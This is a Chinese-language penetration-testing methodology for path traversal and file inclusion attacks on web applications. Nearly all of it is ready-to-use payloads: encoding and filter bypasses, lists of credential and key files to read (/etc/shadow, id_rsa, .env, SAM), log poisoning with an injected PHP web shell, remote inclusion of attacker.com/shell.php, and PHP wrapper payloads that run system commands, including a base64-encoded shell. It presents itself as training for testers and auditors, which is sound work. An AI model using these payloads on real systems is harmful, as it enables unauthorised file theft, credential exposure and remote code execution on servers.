# 路径遍历/文件包含攻击方法论文档

---

# 第一部分：文档概述

## 1.1 编写目的
为渗透测试人员提供路径遍历（Path Traversal）和文件包含（File Inclusion）漏洞的标准化测试与利用流程，帮助识别和利用文件读取、文件包含相关的注入漏洞。

## 1.2 适用范围
适用于存在文件操作功能的 Web 应用、API 接口，包括文件下载、文件预览、图片加载、模板包含等功能模块。

## 1.3 读者对象
本文件主要面向执行渗透测试任务的安全工程师、安全分析师，以及负责代码审计的开发人员。

---

# 第二部分：核心渗透技术专题

## 专题一：路径遍历攻击

### 2.1.1 技术介绍

路径遍历（Path Traversal）是指攻击者通过操纵文件路径参数，访问预期目录之外的文件或目录的攻击方式。

**攻击本质：**
- 利用 `../` 或 `..\` 等路径跳转符
- 绕过应用程序的目录限制
- 读取敏感文件（配置文件、源码、系统文件）

**常见危险函数：**

| 语言 | 危险函数 |
|-----|---------|
| PHP | `file_get_contents()`, `fopen()`, `include()` |
| Java | `FileInputStream`, `Files.readAllBytes()` |
| Python | `open()`, `os.path.join()` |
| Node.js | `fs.readFile()`, `fs.readFileSync()` |
| .NET | `File.ReadAllText()`, `FileStream` |

### 2.2.1 攻击常见业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **文件下载** | 文档下载、日志下载 | 文件名参数可控 |
| **文件预览** | 图片预览、PDF 预览 | 文件路径参数可控 |
| **静态资源** | 模板加载、CSS/JS 加载 | 资源路径可控 |
| **备份功能** | 数据备份、配置导出 | 备份文件路径可控 |
| **文件管理** | 在线文件管理器 | 目录浏览功能 |
| **API 接口** | 文件相关 API | 文件路径参数未过滤 |

### 2.3.1 漏洞探测方法

#### 黑盒测试

**输入点识别：**
- 参数名包含：`file`、`path`、`dir`、`folder`、`document`、`template`、`download`
- 参数值看起来像文件名或路径
- 文件扩展名参数

**初步探测 Payload：**

```
# 基础路径遍历（Linux）
file=../../../etc/passwd
file=....//....//etc/passwd

# 基础路径遍历（Windows）
file=..\..\..\windows\win.ini
file=..%5c..%5c..%5cwindows%5cwin.ini

# URL 编码
file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
file=%2e%2e%2f%2e%2e%2fetc%2fpasswd

# 双重 URL 编码
file=%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Unicode 编码
file=\u002e\u002e\u002f\u002e\u002e\u002fetc\u002fpasswd

# 混合编码
file=..%252f..%252fetc%252fpasswd
```

**响应判断：**
- 返回 `/etc/passwd` 或 `win.ini` 内容
- 出现文件路径相关的错误信息
- 响应中包含敏感文件内容
- 目录列表被泄露

#### 白盒测试

**代码审计关键词：**

```php
// PHP 危险代码
$file = $_GET['file'];
readfile("/var/www/files/" . $file);

// 未验证路径是否在预期目录内
```

```java
// Java 危险代码
String file = request.getParameter("file");
File f = new File("/app/data/" + file);
return new ResponseEntity<>(Files.readAllBytes(f.toPath()));
```

```python
# Python 危险代码
file_path = os.path.join(BASE_DIR, request.args.get('file'))
return send_file(file_path)
```

### 2.4.1 漏洞利用方法

#### Linux 系统文件读取

```
# 基础读取
../../../etc/passwd
../../../etc/shadow

# 配置文件
../../../etc/hosts
../../../etc/resolv.conf
../../../proc/self/environ

# 应用配置
../../../var/www/config.php
../../../home/user/.ssh/id_rsa
../../../root/.ssh/id_rsa

# 日志文件
../../../var/log/apache2/access.log
../../../var/log/nginx/error.log
../../../var/log/auth.log

# 进程信息
/proc/self/cmdline
/proc/self/environ
/proc/version
```

#### Windows 系统文件读取

```
# 基础读取
..\..\..\windows\win.ini
..\..\..\windows\system32\drivers\etc\hosts

# 配置文件
..\..\..\xampp\apache\conf\httpd.conf
..\..\..\wamp\bin\apache\apache.conf

# SAM 文件（需要权限）
..\..\..\windows\system32\config\SAM

# 日志文件
..\..\..\xampp\apache\logs\access.log
..\..\..\xampp\apache\logs\error.log

# 用户文件
..\..\..\Users\username\.ssh\id_rsa
```

#### 源码泄露利用

```
# 读取 Web 应用源码
../../../var/www/html/config.php
../../../var/www/html/WEB-INF/web.xml
../../../application/config/database.yml

# 读取备份文件
../../../backup/db.sql
../../../backup/config.bak
../../../.git/config
../../../.env
```

#### 日志文件投毒 + 路径遍历

```
# 步骤 1：在日志中注入恶意内容
# 访问：http://target/?param=<?php system($_GET['c']); ?>

# 步骤 2：通过路径遍历读取日志文件（包含 PHP 代码）
../../../var/log/apache2/access.log

# 如果服务器解析日志文件中的 PHP，可执行命令
```

### 2.5.1 漏洞利用绕过方法

#### 绕过路径过滤

```
# 如果过滤 ../
..%2f../etc/passwd
....//....//etc/passwd
..;/etc/passwd

# 如果过滤 ..\
..%5c..%5cwindows%5cwin.ini
..\\..\\windows\\win.ini

# 如果过滤 ..
%252e%252e%252fetc%252fpasswd
%u002e%u002e%u002fetc%u002fpasswd

# 使用绝对路径（如果已知）
/file=/etc/passwd
file=file:///etc/passwd

# 使用 URL 协议
file=php://filter/convert.base64-encode/resource=/etc/passwd
file=data://text/plain,<?php system('id'); ?>
```

#### 绕过白名单检查

```
# 如果检查文件扩展名
../../../etc/passwd%00.jpg
../../../etc/passwd\x00.jpg

# 如果检查前缀
files/../../../etc/passwd
files../files/../../../etc/passwd

# 使用符号链接（如果存在）
../../../tmp/evil_link
```

#### 绕过 realpath 检查

```
# 使用长路径绕过
files/longpath/longpath/longpath/../../../etc/passwd

# 使用 Windows 短文件名
C:\PROGRA~1\APACHE~1\conf\httpd.conf
```

---

## 专题二：文件包含攻击

### 2.1.2 技术介绍

文件包含（File Inclusion）是指攻击者通过操纵包含函数的参数，让应用程序包含并执行恶意文件的攻击方式。分为：
- **本地文件包含（LFI）**：包含服务器本地文件
- **远程文件包含（RFI）**：包含远程服务器上的文件

### 2.2.2 攻击常见业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **模板系统** | 页面模板加载 | 模板参数可控 |
| **多语言支持** | 语言文件切换 | lang 参数可控 |
| **模块化设计** | 动态模块加载 | module 参数可控 |
| **配置文件** | 动态配置加载 | config 参数可控 |

### 2.3.2 漏洞探测方法

**初步探测 Payload：**

```
# LFI 测试
page=../../../etc/passwd
template=....//....//etc/passwd

# RFI 测试（需要 allow_url_include=On）
page=http://attacker.com/shell.txt
include=http://attacker.com/shell.php

# PHP 协议测试
page=php://filter/convert.base64-encode/resource=index.php
page=php://input
page=data://text/plain,<?php phpinfo(); ?>
```

### 2.4.2 漏洞利用方法

#### LFI 利用

```
# 读取 PHP 源码
page=php://filter/convert.base64-encode/resource=index.php

# 读取会话文件
page=/var/lib/php/sessions/sess_SESSIONID
page=/var/lib/php5/sessions/sess_SESSIONID

# 读取日志文件（配合投毒）
page=/var/log/apache2/access.log
page=/var/log/auth.log

# 读取 /proc 信息
page=/proc/self/environ
page=/proc/self/cmdline
```

#### RFI 利用

```
# 包含远程 Shell
page=http://attacker.com/shell.php?c=id

# 包含远程文本文件（执行其中代码）
include=http://attacker.com/evil.txt
```

#### PHP 协议利用

```
# php://filter - 读取源码
page=php://filter/convert.base64-encode/resource=config.php

# php://input - 包含 POST 数据
# POST: <?php system('id'); ?>
# GET: page=php://input

# data:// - 包含 data URI
page=data://text/plain,<?php system('id'); ?>
page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==

# zip:// - 包含 zip 文件中的文件
page=zip://shell.jpg%23shell.php
# 上传包含 PHP 代码的图片文件，然后包含它

# phar:// - 包含 phar 文件
page=phar://uploaded_image.jpg/shell.php

# expect:// - 执行命令（需要启用 expect 扩展）
page=expect://id
```

### 2.5.2 漏洞利用绕过方法

#### 绕过扩展名限制

```
# 如果自动添加 .php
page=../../../etc/passwd%00
page=php://filter/convert.base64-encode/resource=index

# 使用路径截断
page=../../../etc/passwd\
page=../../../etc/passwd%20
```

#### 绕过协议限制

```
# 如果过滤 php://
page=php%3a%3afilter/...
page=pHp://FiLtEr/...

# 使用其他协议
page=zip://...
page=phar://...
page=data://...
```

---

# 第三部分：附录

## 3.1 路径遍历 Payload 速查表

| 类别 | Payload | 说明 |
|-----|---------|------|
| **基础遍历** | `../../../etc/passwd` | Linux 基础 |
| **基础遍历** | `..\..\..\windows\win.ini` | Windows 基础 |
| **URL 编码** | `%2e%2e%2f%2e%2e%2fetc%2fpasswd` | 编码绕过 |
| **双重编码** | `%252e%252e%252fetc%252fpasswd` | 双重编码 |
| **Unicode** | `\u002e\u002e\u002fetc\u002fpasswd` | Unicode 绕过 |
| **混合路径** | `..;/etc/passwd` | 分号绕过 |
| **长路径** | `....//....//etc/passwd` | 双写绕过 |
| **文件协议** | `file:///etc/passwd` | file 协议 |

## 3.2 敏感文件路径清单

### Linux

| 文件 | 路径 | 说明 |
|-----|------|------|
| 用户信息 | `/etc/passwd` | 用户列表 |
| 密码哈希 | `/etc/shadow` | 密码哈希（需要 root） |
| SSH 密钥 | `/root/.ssh/id_rsa` | Root 私钥 |
| Apache 日志 | `/var/log/apache2/access.log` | 访问日志 |
| Nginx 日志 | `/var/log/nginx/error.log` | 错误日志 |
| 历史命令 | `/root/.bash_history` | 命令历史 |
| Cron 任务 | `/etc/crontab` | 定时任务 |

### Windows

| 文件 | 路径 | 说明 |
|-----|------|------|
| 系统配置 | `C:\Windows\win.ini` | 系统配置 |
| 主机文件 | `C:\Windows\System32\drivers\etc\hosts` | 主机映射 |
| Apache 日志 | `C:\xampp\apache\logs\access.log` | 访问日志 |
| IIS 日志 | `C:\inetpub\logs\LogFiles\W3SVC1\u_ex*.log` | IIS 日志 |
| 用户文件 | `C:\Users\username\.ssh\id_rsa` | SSH 私钥 |

## 3.3 PHP 协议列表

| 协议 | 用途 | 示例 |
|-----|------|------|
| `php://filter` | 过滤读取 | `php://filter/convert.base64-encode/resource=index.php` |
| `php://input` | 读取 POST 数据 | `page=php://input` + POST `<?php system('id'); ?>` |
| `data://` | Data URI | `data://text/plain,<?php system('id'); ?>` |
| `zip://` | 包含 zip 文件 | `zip://shell.jpg%23shell.php` |
| `phar://` | 包含 phar 文件 | `phar://uploaded.jpg/shell.php` |
| `expect://` | 执行命令 | `expect://id` |

## 3.4 参考资源

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PortSwigger - Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [PayloadsAllTheThings - Path Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Path%20Traversal)
